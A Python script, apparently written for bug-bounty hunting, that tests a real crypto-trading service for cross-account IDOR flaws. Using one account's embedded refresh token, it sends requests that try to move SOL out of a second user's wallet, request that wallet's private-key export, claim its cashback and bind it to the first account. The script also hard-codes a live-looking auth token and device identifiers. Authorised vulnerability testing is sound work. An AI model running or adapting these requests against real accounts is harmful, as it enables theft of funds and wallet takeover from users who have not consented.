#!/usr/bin/env python3
"""
CROSS-ACCOUNT IDOR VALIDATION SCRIPT
Tests if Account A token can operate on Account B's wallet/assets

This is the $50k test — if any of these succeed, it's critical IDOR.
"""
import json
import requests
from datetime import datetime

# ACCOUNT A - Primary test account
REFRESH_TOKEN_A = "eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJnbWduLmFpL3JlZnJlc2giLCJkYXRhIjp7InVzZXJfaWQiOiIwMGRhZTg3MC04NDkwLTRkMTktYmZjMC0zOWNlNDllOTA2YjUiLCJjbGllbnRfaWQiOiJnbWduX3dlYl8yMDI2MDcxNC0yMTE5LWM5MTMxNDEiLCJkZXZpY2VfaWQiOiJkZTYyMGE1Ny1kOThlLTQyOTMtYjAwNy01ZDMxNTQ1NWUyMWQiLCJmYXRoZXJfaWQiOiIiLCJmaW5nZXJwcmludCI6InYxNTMyNDdiOWUwZTE4NGZiZWQzZmFjNzNmMTlkY2E2OGEiLCJhcHAiOiJnbWduIiwicGxhdGZvcm0iOiJ3ZWIifSwiZXhwIjoxNzg2NjU2NjEyLCJpYXQiOjE3ODQwNjQ2MTIsImlzcyI6ImdtZ24uYWkvc2lnbmVyIiwianRpIjoiOTk0NzA5OTctZmQxMC00YmE2LWEyYTAtMzExODUwNTNhMTM2IiwibmJmIjoxNzg0MDY0NjEyLCJzdWIiOiJnbWduLmFpL3JlZnJlc2giLCJ1c2VyX2lkIjoiMDBkYWU4NzAtODQ5MC00ZDE5LWJmYzAtMzljZTQ5ZTkwNmI1IiwidmVyIjoiMS4wIn0.H47Vj56YK1CYK08BpclIOKLFrootpc9Aud5BYkADA4GulAD2uaSEtwA5JYUG2Pj_PQak431Fk47_Q2R9rt4CSg"
ACCESS_TOKEN_A = None
WALLET_A = None
USER_ID_A = "00dae870-8490-4d19-bfc0-39ce49e906b5"

# ACCOUNT B - Second test account
REFRESH_TOKEN_B = None  # Not needed for this test - we just need the wallet address
ACCESS_TOKEN_B = None
WALLET_B = "DSGGcV3r7tToJMHp2XUuEK2QRJQ99G9sZxp4Ty89BZep"  # Account B's SOL wallet
USER_ID_B = None

try:
    with open("cookies.json") as f:
        COOKIES = json.load(f)
except:
    COOKIES = {}

PARAMS = {
    "device_id": "de620a57-d98e-4293-b007-5d315455e21d",
    "fp_did": "5154d56b50e3061629dca8bf8538b346",
    "client_id": "gmgn_web_20260714-2119-c913141",
    "from_app": "gmgn",
    "app_ver": "20260714-2119-c913141",
    "tz_name": "America/New_York",
    "tz_offset": "-18000",
    "app_lang": "en-US",
    "os": "web",
    "worker": "0"
}

def get_headers(token):
    return {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "application/json, text/plain, */*",
        "Origin": "https://gmgn.ai",
        "Referer": "https://gmgn.ai/",
    }

def refresh_token(refresh_token):
    """Get fresh access token."""
    print(f"[*] Refreshing access token...")
    try:
        r = requests.post(
            "https://gmgn.ai/account/account/refresh_access_token",
            params=PARAMS,
            headers={
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
                "Accept": "application/json, text/plain, */*",
                "Origin": "https://gmgn.ai",
                "Referer": "https://gmgn.ai/",
            },
            cookies=COOKIES if COOKIES else {},
            json={"refresh_token": refresh_token},
            timeout=15
        )
        if r.status_code == 200:
            d = r.json()
            if d.get("code") == 0:
                token = d["data"]["data"]["token"]
                print(f"✅ Got access token: {token[:50]}...")
                return token
        print(f"❌ Failed: {r.text[:200]}")
    except Exception as e:
        print(f"❌ Exception: {e}")
    return None

def get_user_info(access_token):
    """Get user's wallet addresses and info."""
    print(f"[*] Fetching user info...")
    try:
        r = requests.post(
            "https://gmgn.ai/account/user_info",
            params=PARAMS,
            headers=get_headers(access_token),
            cookies=COOKIES if COOKIES else {},
            json={},
            timeout=10
        )
        print(f"    Status: {r.status_code}")
        print(f"    Response: {r.text[:500]}")
        
        if r.status_code == 200:
            d = r.json()
            if d.get("code") == 0:
                # Data is nested: {"data": {"data": {...}}}
                user = d.get("data", {}).get("data", {})
                print(f"✅ User ID: {user.get('user_id')}")
                print(f"   Email: {user.get('email') or (user.get('accounts', [{}])[0].get('account') if user.get('accounts') else 'N/A')}")
                print(f"   SOL wallet: {user.get('bot_sol_address')}")
                print(f"   BSC wallet: {user.get('bot_bsc_address')}")
                return user
            else:
                print(f"⚠️  Error code: {d.get('code')} - {d.get('message')}")
        
    except Exception as e:
        print(f"❌ Exception: {e}")
    return None

def test_cross_account_transfer(token_a, wallet_b):
    """CRITICAL TEST: Can Account A generate MFA params for Account B's wallet?"""
    print(f"\n{'='*80}")
    print(f"💀 TEST 1: CROSS-ACCOUNT TRANSFER IDOR")
    print(f"{'='*80}")
    print(f"Account A token → generate txn_id for Account B wallet")
    
    payload = {
        "usage": "transfer",
        "biz_params": {
            "transfer_id": "999",
            "transfer_type": "999",
            "chain": "sol",
            "from_address": wallet_b,
            "to_address": "3vhHN7svfY9dcmicS9BEaBYQGrHTGgh5ox3C3SbyHsCr",
            "amount": "100000",
            "amount_txt": "0.0001",
            "token_address": "So11111111111111111111111111111111111111112",
            "symbol": "SOL"
        }
    }
    
    try:
        r = requests.post(
            "https://gmgn.ai/wallet-api/v1/generate_mfa_params",
            params=PARAMS,
            headers=get_headers(token_a),
            cookies=COOKIES,
            json=payload,
            timeout=10
        )
        print(f"\n[REQUEST]")
        print(f"POST /wallet-api/v1/generate_mfa_params")
        print(f"from_address: {wallet_b} (ACCOUNT B)")
        print(f"Auth: Account A token")
        
        print(f"\n[RESPONSE]")
        print(f"Status: {r.status_code}")
        
        if r.status_code == 200:
            d = r.json()
            print(f"Body: {json.dumps(d, indent=2)}")
            
            if d.get("code") == 0:
                txn_id = d.get("data", {}).get("txn_id")
                verify_items = d.get("data", {}).get("verify_items", [])
                
                print(f"\n{'='*80}")
                print(f"🔥 CRITICAL IDOR CONFIRMED!")
                print(f"{'='*80}")
                print(f"Account A token successfully generated txn_id for Account B wallet!")
                print(f"txn_id: {txn_id}")
                print(f"verify_items: {verify_items}")
                print(f"\nIMPACT: Complete fund drain capability across accounts")
                print(f"SEVERITY: CRITICAL")
                print(f"BOUNTY: $50,000+")
                
                return {"success": True, "txn_id": txn_id, "verify_items": verify_items}
            else:
                print(f"\n⚠️  Returned error code: {d.get('code')} - {d.get('message')}")
                if "not owned" in str(d.get("message", "")).lower() or "unauthorized" in str(d.get("message", "")).lower():
                    print(f"✅ Good: Server validates wallet ownership")
                else:
                    print(f"⚠️  Different error - may still be exploitable")
        else:
            print(f"Body: {r.text[:500]}")
            
    except Exception as e:
        print(f"❌ Exception: {e}")
    
    return {"success": False}

def test_cross_account_export_key(token_a, wallet_b):
    """CRITICAL TEST: Can Account A export Account B's private key?"""
    print(f"\n{'='*80}")
    print(f"💀 TEST 2: CROSS-ACCOUNT KEY EXPORT IDOR")
    print(f"{'='*80}")
    print(f"Account A token → export Account B's private key")
    
    payload = {
        "usage": "export_key",
        "biz_params": {
            "address": wallet_b,
            "chain": "sol"
        }
    }
    
    try:
        r = requests.post(
            "https://gmgn.ai/wallet-api/v1/generate_mfa_params",
            params=PARAMS,
            headers=get_headers(token_a),
            cookies=COOKIES,
            json=payload,
            timeout=10
        )
        print(f"\n[REQUEST]")
        print(f"POST /wallet-api/v1/generate_mfa_params")
        print(f"usage: export_key")
        print(f"address: {wallet_b} (ACCOUNT B)")
        print(f"Auth: Account A token")
        
        print(f"\n[RESPONSE]")
        print(f"Status: {r.status_code}")
        
        if r.status_code == 200:
            d = r.json()
            print(f"Body: {json.dumps(d, indent=2)}")
            
            if d.get("code") == 0:
                txn_id = d.get("data", {}).get("txn_id")
                
                print(f"\n{'='*80}")
                print(f"🔥 CRITICAL IDOR CONFIRMED!")
                print(f"{'='*80}")
                print(f"Account A can export Account B's private key!")
                print(f"txn_id: {txn_id}")
                print(f"\nIMPACT: Complete wallet takeover")
                print(f"SEVERITY: CRITICAL")
                print(f"BOUNTY: $75,000+")
                
                return {"success": True, "txn_id": txn_id}
            else:
                print(f"\n⚠️  Returned error: {d.get('code')} - {d.get('message')}")
        else:
            print(f"Body: {r.text[:500]}")
            
    except Exception as e:
        print(f"❌ Exception: {e}")
    
    return {"success": False}

def test_cross_account_cashback(token_a, wallet_b):
    """HIGH TEST: Can Account A claim Account B's cashback?"""
    print(f"\n{'='*80}")
    print(f"💀 TEST 3: CROSS-ACCOUNT CASHBACK CLAIM IDOR")
    print(f"{'='*80}")
    print(f"Account A token → claim Account B's cashback")
    
    payload = {
        "chain": "sol",
        "address": wallet_b
    }
    
    try:
        r = requests.post(
            "https://gmgn.ai/rebate/api/v1/cashback/claim/apply",
            params=PARAMS,
            headers=get_headers(token_a),
            cookies=COOKIES,
            json=payload,
            timeout=10
        )
        print(f"\n[REQUEST]")
        print(f"POST /rebate/api/v1/cashback/claim/apply")
        print(f"address: {wallet_b} (ACCOUNT B)")
        print(f"Auth: Account A token")
        
        print(f"\n[RESPONSE]")
        print(f"Status: {r.status_code}")
        
        if r.status_code == 200:
            d = r.json()
            print(f"Body: {json.dumps(d, indent=2)}")
            
            if d.get("code") == 0:
                status_code = d.get("data", {}).get("status_code")
                message = d.get("data", {}).get("message")
                
                if status_code == "CB5003":
                    print(f"\n⚠️  No funds to claim, but request was processed")
                    print(f"IMPACT: Would succeed if Account B had pending cashback")
                    print(f"SEVERITY: HIGH")
                    print(f"BOUNTY: $10,000-$25,000")
                else:
                    print(f"\n🔥 IDOR CONFIRMED - Cashback claimed!")
                    print(f"SEVERITY: CRITICAL")
                    print(f"BOUNTY: $25,000+")
                
                return {"success": True, "status_code": status_code, "message": message}
            else:
                print(f"\n⚠️  Returned error: {d.get('code')} - {d.get('message')}")
        else:
            print(f"Body: {r.text[:500]}")
            
    except Exception as e:
        print(f"❌ Exception: {e}")
    
    return {"success": False}

def test_cross_account_bind_wallet(token_a, wallet_b):
    """CRITICAL TEST: Can Account A bind Account B's wallet to their account?"""
    print(f"\n{'='*80}")
    print(f"💀 TEST 4: CROSS-ACCOUNT BIND WALLET IDOR")
    print(f"{'='*80}")
    print(f"Account A token → bind Account B's wallet")
    
    # First get a txn_id for bind_wallet usage
    print(f"\n[STEP 1] Generate txn_id with usage=bind_wallet")
    try:
        r = requests.post(
            "https://gmgn.ai/wallet-api/v1/generate_mfa_params",
            params=PARAMS,
            headers=get_headers(token_a),
            cookies=COOKIES,
            json={"usage": "bind_wallet"},
            timeout=10
        )
        
        if r.status_code == 200:
            d = r.json()
            if d.get("code") == 0:
                txn_id = d.get("data", {}).get("txn_id")
                print(f"✅ Got txn_id: {txn_id}")
                
                # Now try to bind Account B's wallet using this txn_id
                print(f"\n[STEP 2] Bind Account B wallet using Account A's txn_id")
                
                bind_payload = {
                    "wallet_address": wallet_b,
                    "chain": "sol",
                    "txn_id": txn_id
                }
                
                r2 = requests.post(
                    "https://gmgn.ai/account/bind_wallet",
                    params=PARAMS,
                    headers=get_headers(token_a),
                    cookies=COOKIES,
                    json=bind_payload,
                    timeout=10
                )
                
                print(f"\n[RESPONSE]")
                print(f"Status: {r2.status_code}")
                
                if r2.status_code == 200:
                    d2 = r2.json()
                    print(f"Body: {json.dumps(d2, indent=2)}")
                    
                    if d2.get("code") == 0:
                        print(f"\n{'='*80}")
                        print(f"🔥 CRITICAL IDOR CONFIRMED!")
                        print(f"{'='*80}")
                        print(f"Account A successfully bound Account B's wallet!")
                        print(f"\nIMPACT: Complete account takeover + full trading authority")
                        print(f"SEVERITY: CRITICAL")
                        print(f"BOUNTY: $75,000+")
                        
                        return {"success": True}
                    else:
                        print(f"\n⚠️  Error: {d2.get('code')} - {d2.get('message')}")
                else:
                    print(f"Body: {r2.text[:500]}")
    except Exception as e:
        print(f"❌ Exception: {e}")
    
    return {"success": False}

def main():
    global ACCESS_TOKEN_A, ACCESS_TOKEN_B, WALLET_A, WALLET_B
    
    print("="*80)
    print("🎯 CROSS-ACCOUNT IDOR VALIDATION FRAMEWORK")
    print("="*80)
    print(f"Started: {datetime.now()}")
    print(f"\nTesting if Account A token can operate on Account B's assets")
    print(f"This is the $50k test.\n")
    
    # STEP 1: Refresh Account A token
    print("\n[ACCOUNT A SETUP]")
    ACCESS_TOKEN_A = refresh_token(REFRESH_TOKEN_A)
    if not ACCESS_TOKEN_A:
        print("❌ FAILED - Can't refresh Account A token")
        return
    
    user_a = get_user_info(ACCESS_TOKEN_A)
    if not user_a:
        print("❌ FAILED - Can't get Account A info")
        return
    
    WALLET_A = user_a.get("bot_sol_address")
    
    # STEP 2: Get Account B info
    print("\n[ACCOUNT B SETUP]")
    if not WALLET_B:
        print("⚠️  ERROR: No Account B wallet provided")
        return
    
    if REFRESH_TOKEN_B:
        print(f"Account B wallet provided: {WALLET_B}")
        print(f"Getting Account B details...")
        ACCESS_TOKEN_B = refresh_token(REFRESH_TOKEN_B)
        if not ACCESS_TOKEN_B:
            print("❌ FAILED - Can't refresh Account B token")
            return
        
        user_b = get_user_info(ACCESS_TOKEN_B)
        if not user_b:
            print("❌ FAILED - Can't get Account B info")
            return
        
        WALLET_B = user_b.get("bot_sol_address")
    else:
        print(f"Account B wallet: {WALLET_B}")
        print(f"Testing cross-account access WITHOUT Account B's token")
        print(f"This is the REAL IDOR test.\n")
    
    # STEP 3: Run IDOR tests
    print("\n" + "="*80)
    print("RUNNING IDOR TESTS")
    print("="*80)
    
    results = {}
    
    # Test 1: Cross-account transfer
    results["transfer"] = test_cross_account_transfer(ACCESS_TOKEN_A, WALLET_B)
    
    # Test 2: Cross-account key export
    results["export_key"] = test_cross_account_export_key(ACCESS_TOKEN_A, WALLET_B)
    
    # Test 3: Cross-account cashback claim
    results["cashback"] = test_cross_account_cashback(ACCESS_TOKEN_A, WALLET_B)
    
    # Test 4: Cross-account bind wallet
    results["bind_wallet"] = test_cross_account_bind_wallet(ACCESS_TOKEN_A, WALLET_B)
    
    # STEP 4: Summary
    print("\n" + "="*80)
    print("📊 TEST RESULTS SUMMARY")
    print("="*80)
    
    critical_found = False
    for test_name, result in results.items():
        if result.get("success"):
            print(f"🔥 {test_name.upper()}: IDOR CONFIRMED")
            critical_found = True
        else:
            print(f"✅ {test_name.upper()}: Protected")
    
    if critical_found:
        print("\n" + "="*80)
        print("💀 CRITICAL IDOR FOUND - REPORT IMMEDIATELY")
        print("="*80)
        print("This is a $50,000+ finding. Write the report now.")
    else:
        print("\n✅ No cross-account IDOR found in these tests")
        print("   The server validates wallet ownership correctly")
    
    # Save results
    with open("cross_account_idor_results.json", "w") as f:
        json.dump({
            "timestamp": str(datetime.now()),
            "account_a_user_id": USER_ID_A,
            "account_a_wallet": WALLET_A,
            "account_b_wallet": WALLET_B,
            "results": results
        }, f, indent=2)
    
    print(f"\n💾 Results saved to cross_account_idor_results.json")

if __name__ == "__main__":
    main()
